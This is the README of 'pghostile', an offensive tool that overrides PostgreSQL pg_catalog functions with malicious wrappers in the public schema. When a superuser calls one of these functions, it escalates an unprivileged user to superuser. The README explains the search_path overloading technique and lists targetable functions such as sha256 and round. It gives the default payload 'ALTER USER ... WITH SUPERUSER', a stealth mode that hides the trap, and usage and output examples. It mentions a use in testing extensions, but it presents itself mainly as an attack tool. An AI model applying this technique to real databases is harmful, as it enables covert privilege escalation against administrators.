# PGHOSTILE
Pghostile can make PostgreSQL an hostile environment for superusers and a funny playground for attackers.  
Pghostile is a automated tool for overriding "system" functions (the ones from the 'pg_catalog' schema) allowing an attacker to elevate privileges if/when these functions are called by a superuser.  

It can be also used to test the security of the PostgreSQL extension. You can run pghostile to create the "exploit functions" and then run the extension's unit tests and see if you get superuser power after that.

## How it works
In PostgreSQL every function is identified by it's name plus the number/types of arguments (like in Java). If a function is defined to accept a numberic value and you define a function with the same name that accepts an integer, your function will be called if the input parameter is an integer and the original one will be called if the input is a float.  
Considering that an unprivileged user can create functions in the public schema and that the public schema is part of the 'search_path', it's relatively easy to trick a superuser to run code from public instead of pg_catalog.  

In a few words, pghostile searches pg_catalog for functions that can be overridden and creates a malicious wrapper of them in the public schema.  

Currently, it can identify ~150 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:
```SQL
select sha256('a');
select byteaout('a');
select int4(1);
select btarraycmp(array [1, 2], array [1, 2]);
select array_position(array [1, 2], 1, 1);
select unnest(array [1, 2]);
select array_remove(array [1, 2], 1);
select array_replace(array [1, 2], 1, 1);
select varcharout('a');
select log(1);
select log10(1);
select ln(1);
select round(1);
select trunc(1);
select sqrt(1);
select pow(1, 1);
select power(1, 1);
select exp(1);
```

Then, if the superuser runs something like `select sha256('test123')` you will be superuser in no time ;)

## Usage
```
positional arguments:
  db_username           Database username
  db_name               Database name

optional arguments:
  -h, --help            show this help message and exit
  -X, --disable-exploits-creation
                        Do not create exploit functions
  -H DB_HOST, --db-host DB_HOST
                        Database host (default 127.0.0.1)
  -p DB_PORT, --db-port DB_PORT
                        Database port
  -P, --ask-pass        Prompt for database passsword
  -o OUT, --out OUT     Output dir (deafult ./out)
  -T, --skip-tests      Disable test
  -s, --disable-stealth-mode
                        Disable stealth mode
  -S DB_SSL_MODE, --db-ssl-mode DB_SSL_MODE
                        Database ssl mode (default None)
  -x EXPLOIT_PAYLOAD, --exploit-payload EXPLOIT_PAYLOAD
                        The SQL commands
```

With the -X option you can disable the actual exploit creation. It will just run the tests to see which functions can be overridden.  
With the -T option you can disable the tests and just create the exploit functions.  
The -x option allows you to specify what SQL command(s) should be used in your exploit. By default it's ```ALTER USER <db_username> WITH SUPERUSER;```.  
The -s option disables the "stealth mode". In stealth mode the wrapping functions will call the original function from pg_catalog, in this way the superuser won't see any anomaly when calling a wrapped function.  

### Example
```
pghostile.py user1 testdb -H 10.211.55.12
```
```
Starting ... 

[ * ] 332 interesting functions have been identified
[ * ] Creating test functions
[ * ] Testing functions
[ * ] Deleting test functions
[ * ] Creating exploit functions
[ * ] Done! 251 functions have been created

150 exploitable functions and params combinations have been tested!
The './out' folder contains the output
```
